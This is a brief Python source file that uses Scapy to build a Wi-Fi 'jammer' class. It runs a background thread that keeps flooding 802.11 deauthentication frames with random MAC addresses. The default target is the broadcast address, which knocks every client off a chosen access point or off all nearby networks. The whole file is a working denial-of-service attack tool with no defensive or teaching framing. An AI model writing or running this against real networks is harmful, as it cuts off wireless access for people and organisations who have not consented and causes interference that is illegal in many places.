from scapy.all import *
import threading
import time

class Jammer:
    def __init__(self):
        self.running = False
        self.thread = None

    def start_jamming(self, interface, target_bssid=None, channel=None):
        self.running = True
        self.thread = threading.Thread(target=self._jam_loop, args=(interface, target_bssid))
        self.thread.start()
        return "Jamming started (Packet Flood)..."

    def _jam_loop(self, interface, target_bssid):
        # Flood random packets or deauths
        # If target_bssid is None, broadcast
        target = target_bssid if target_bssid else "FF:FF:FF:FF:FF:FF"
        
        while self.running:
            try:
                # Random noise / Deauth flood
                pkt = RadioTap()/Dot11(addr1=target, addr2=RandMAC(), addr3=RandMAC())/Dot11Deauth()
                sendp(pkt, iface=interface, count=100, verbose=False)
                time.sleep(0.05)
            except Exception as e:
                print(f"Jam Error: {e}")
                break

    def stop_jamming(self):
        self.running = False
        if self.thread:
            self.thread.join()
        return "Jamming stopped."
